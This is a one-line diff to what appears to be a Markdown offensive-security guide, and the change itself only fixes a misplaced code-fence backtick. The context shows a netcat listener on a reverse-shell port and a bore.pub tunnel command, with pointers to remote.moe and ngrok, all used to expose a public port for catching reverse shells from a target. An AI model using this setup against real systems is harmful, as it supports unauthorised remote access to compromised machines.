@@ -460,7 +460,7 @@ nc -vnlp $(cat /config/self/reverse_port)
 Using [bore.pub](https://github.com/ekzhang/bore) (free):
 ```sh
 # Forward a random public TCP port to localhost:31337
-bore local 31337 --to bore.pub```
+bore local 31337 --to bore.pub
 ```
 
 See also [remote.moe](#revese-shell-remote-moe) (free) to forward raw TCP from the target to your workstation or [ngrok](https://ngrok.com/) (paid subscription) to forward a raw public TCP port.
